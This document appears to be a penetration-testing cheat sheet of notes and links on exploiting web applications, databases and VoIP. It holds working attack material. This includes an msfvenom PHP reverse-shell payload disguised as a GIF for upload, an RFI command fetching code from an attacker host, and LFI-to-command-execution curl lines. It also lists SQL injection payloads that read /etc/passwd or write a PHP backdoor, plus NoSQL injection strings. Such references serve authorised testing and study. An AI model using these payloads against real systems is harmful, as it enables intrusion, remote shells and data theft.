# Exploiting Vulnerabilities

> _That was the division in the hacking world: There were people who were exploring it and the people who were trying to make money from it. And, generally, you stayed away from anyone who was trying to make money from it._
>
> _**— **_**Jeff Moss**

## Finding Exploits

---

##### Search Exploit-DB

```
Kali> searchsploit windows 2003 | grep -i local
```

##### Search Google

> ```
> Google> site:exploit-db.com exploit kernel <= 3
> ```

##### Search Metasploit

```
Kali> grep -R "W7" /usr/share/metasploit-framework/modules/exploit/windows/*
```

##### Search Vulners

[https://vulners.com/audit](https://vulners.com/audit)

## Compiling Exploits

---

##### Compile for Windows

```
Kali> i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe
```

##### Compile for Architectures

```
Kali> gcc -m32 -o output32 hello.c (32 bit)
Kali> gcc -m64 -o output hello.c (64 bit)
```

## Breaking out of Virtualization

---

##### Resources

[https://www.youtube.com/watch?v=9ISRZJetUJw](https://www.youtube.com/watch?v=9ISRZJetUJw)

## WebSockets

---

##### Resources

[https://www.youtube.com/watch?v=bRn6ViFAomY](https://www.youtube.com/watch?v=bRn6ViFAomY)

## TCP

---

[http://phrack.org/issues/49/7.html\#article](https://www.gitbook.com/book/dostoevskylabs/dostoevskylabs-pentest-notes/edit#)

## IPV6

---

[http://uninformed.org/?v=all&a=46&t=txt](https://www.gitbook.com/book/dostoevskylabs/dostoevskylabs-pentest-notes/edit#)

## HTTP

---

##### Resources

[https://www.owasp.org/index.php/Category:OWASP\_Video](https://www.gitbook.com/book/dostoevskylabs/dostoevskylabs-pentest-notes/edit#)

[https://www.youtube.com/watch?v=1Newz\_wkMvs](https://www.youtube.com/watch?v=1Newz_wkMvs)

[http://www.ush.it/2008/08/18/lfi2rce-local-file-inclusion-to-remote-code-execution-advanced-exploitation-proc-shortcuts/](http://www.ush.it/2008/08/18/lfi2rce-local-file-inclusion-to-remote-code-execution-advanced-exploitation-proc-shortcuts/)

[https://vimeo.com/26751019](https://vimeo.com/26751019)

[https://warroom.securestate.com/updating-anti-csrf-tokens-burp-suite/](https://warroom.securestate.com/updating-anti-csrf-tokens-burp-suite/)

[https://0xzoidberg.wordpress.com/category/security/lfi-rfi/](https://0xzoidberg.wordpress.com/category/security/lfi-rfi/)

[https://www.hackersonlineclub.com/lfi-rfi/](https://www.hackersonlineclub.com/lfi-rfi/)

[https://www.owasp.org/images/9/9e/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf](https://www.owasp.org/images/9/9e/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf)

[https://github.com/minimaxir/big-list-of-naughty-strings](https://github.com/minimaxir/big-list-of-naughty-strings)

[https://www.youtube.com/watch?v=Qvtfagwlfwg](https://www.youtube.com/watch?v=Qvtfagwlfwg)

[http://blog.portswigger.net/2015/08/server-side-template-injection.html](http://blog.portswigger.net/2015/08/server-side-template-injection.html)

[https://portswigger.net/knowledgebase/papers/ServerSideTemplateInjection.pdf](https://portswigger.net/knowledgebase/papers/ServerSideTemplateInjection.pdf)

[http://www.thespanner.co.uk/2013/05/16/dom-clobbering/](http://www.thespanner.co.uk/2013/05/16/dom-clobbering/)

[https://www.youtube.com/watch?v=kedmtrIEW1k&list=PLH15HpR5qRsXF78lrpWP2JKpPJs\_AFnD7&index=111](https://www.youtube.com/watch?v=kedmtrIEW1k&list=PLH15HpR5qRsXF78lrpWP2JKpPJs_AFnD7&index=111)

[http://www.sempf.net/post/Cracking-and-Fixing-REST-APIs](http://www.sempf.net/post/Cracking-and-Fixing-REST-APIs)

[http://www.irongeek.com/i.php?page=videos/converge2015/track109-cracking-and-fixing-rest-services-bill-sempf](http://www.irongeek.com/i.php?page=videos/converge2015/track109-cracking-and-fixing-rest-services-bill-sempf)

[http://www.thespanner.co.uk/2014/03/21/rpo/](http://www.thespanner.co.uk/2014/03/21/rpo/)

[https://www.ambionics.io/blog/php-generic-gadget-chains](https://www.ambionics.io/blog/php-generic-gadget-chains)

[https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

[https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html)

[http://www.ush.it/2008/08/18/lfi2rce-local-file-inclusion-to-remote-code-execution-advanced-exploitation-proc-shortcuts/](http://www.ush.it/2008/08/18/lfi2rce-local-file-inclusion-to-remote-code-execution-advanced-exploitation-proc-shortcuts/)

##### Headers

> ###### Send fake IP

```
Kali> curl --header "X-Forwarded-For: 192.168.1.1" http://$TARGET
```

##### XXE

> ###### Resources

[https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection](https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection)

[https://www.youtube.com/watch?v=EZxGa6dqero](https://www.youtube.com/watch?v=EZxGa6dqero)

[https://www.youtube.com/watch?v=LZUlw8hHp44](https://www.youtube.com/watch?v=LZUlw8hHp44)

##### XSS

> ###### TODO

##### CSRF

> ###### Resources

[https://www.youtube.com/watch?v=vRBihr41JTo](https://www.youtube.com/watch?v=vRBihr41JTo)

##### SSRF

> ###### Resources

###### [https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/](https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/)

###### [https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)

> ###### Example

```
Kali> curl http://$TARGET:8080/index.php?url=
        $(echo -n "http://$TARGET:8080@127.0.0.1:$INTERNALPORT/admin" | base64)
```

##### Command Injection

> ###### Log File Command Execution

```
# Trick to allow Command Execution by LFI to the log files
Kali> curl "http://$TARGET/index.php?path=/proc/self/environ%00&cmd=$(whoami)"
Kali> curl “http://$TARGET/index.php?path=/proc/self/fd/9%00&cmd=$(whoami);”
```

##### LFI

> ###### Resources

###### [https://www.exploit-db.com/docs/40992.pdf](https://www.exploit-db.com/docs/40992.pdf)

> ###### Examples

```
file:///etc/passwd
../../../etc/passwd
php://filter/convert.base64-encode/resource=admin.php
php://filter/convert.base64-encode/resource=../../../../../etc/passwd
php://input
    send post data
expect://whoami
```

##### RFI

> ###### External File

```
Kali> echo "<?php phpinfo(); ?>" > evil.txt
http://$TARGET/index.php?path=http://$ATTACKER/evil.txt
```

> ###### Internal Resource

```
# Sometimes RFI can lead to viewing internal resources, here are some commands to help
# enumerate all the things

# Port scan the internal resources available
Kali> wfuzz -c -z range,1-65535 --filter "l>2" http://$TARGET/proxy.php?path=localhost:FUZZ

# If you find one, dirbust it.
Kali> wfuzz -c -w /usr/share/wordlists/dirb/big.txt --filter "l>11" http://$TARGET:8080
```

##### Padding Oracle Attack

> ###### Resources

[https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html](https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html)

> ###### Arguments

```
url - first argument is the URL
encrpted - second argument is the encrypted text
bits - third argument is the number of bits per block
-cookies - define a cookie to use
-plaintext - plaintext to encrypt
```

> ###### Examples

```
Kali> padBuster.pl http://$TARGET "ENC-COOKIE-TEXT" 8
                                -cookies "ENC-COOKIE"
                                -plaintext '{"user":"admin","role":"admin"}'
```

##### File Upload

> ###### Make a backdoor GIF

```
# As a note, try to overwrite the magic bytes of your backdoor with a valid image
# so that the check will validate. This includes Content-Type.
Kali> msfvenom --list | grep php
Kali> msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.15.237 LPORT=54321 -o evil.php
Kali> echo “FFD8FFEo” | xxd -r -p > evil.gif
Kali> cat evil.php >> evil.gif
```

> ###### Upload From CLI

```
Kali> curl -X POST
                -F "field1=test"
                -F "file=@/home/user/evil.gif"
                http://$TARGET/upload.php
                --cookie "cookie"
```

## E-Mail

---

##### Resources

[https://www.youtube.com/watch?v=eZxWDCetqkE](https://www.youtube.com/watch?v=eZxWDCetqkE)

## iSCSI

---

##### Resources

[https://www.pentestpartners.com/security-blog/an-interesting-route-to-domain-admin-iscsi/](https://www.pentestpartners.com/security-blog/an-interesting-route-to-domain-admin-iscsi/)

## Databases

---

##### MySQL

> ###### Resources

[https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection)

[https://www.trustwave.com/Resources/SpiderLabs-Blog/Sqlmap-Tricks-for-Advanced-SQL-Injection/](https://www.trustwave.com/Resources/SpiderLabs-Blog/Sqlmap-Tricks-for-Advanced-SQL-Injection/)

###### Examples

```
username'--
1'||'1'<'2
'OR 1=1;--
'OR 1=1;#
'OR 1=1 LIMIT 1; #
AND 1 = 2 UNION SELECT 1,2,3,4,5
1'1
1 exec sp_ (or exec xp_)
1 and 1=1
1' and 1=(select count(*) from tablenames); --
1 or 1=1
1' or '1'='1
1or1=1
1'or'1'='1
fake@ema'or'il.nl'='il.nl
1 union all select 1,2,3,4,load_file("/etc/passwd"),6
1 union all select 1,2,3,4,"<?php ?>",6 into outfile '/var/www/html/backdoor.php'
```

##### MSSQL

> ###### Resources

[http://travisaltman.com/pen-test-and-hack-microsoft-sql-server-mssql/](http://travisaltman.com/pen-test-and-hack-microsoft-sql-server-mssql/)

[https://www.gracefulsecurity.com/sql-injection-cheat-sheet-mssql/](https://www.gracefulsecurity.com/sql-injection-cheat-sheet-mssql/)

##### MongoDB

> ###### Resources

[https://github.com/codingo/NoSQLMap](https://github.com/codingo/NoSQLMap)

> ###### Examples

```
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
';sleep(5000);
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
```

## PBX

---

##### Resources

[https://www.backtrack-linux.org/wiki/index.php/Pentesting\_VOIP](https://www.backtrack-linux.org/wiki/index.php/Pentesting_VOIP)

[http://phrack.org/issues/49/5.html\#article](https://www.gitbook.com/book/dostoevskylabs/dostoevskylabs-pentest-notes/edit#)

##### Examples

```
Kali> svmap $TARGET
Kali> svwar -m INVITE -eSTART-END $TARGET
```



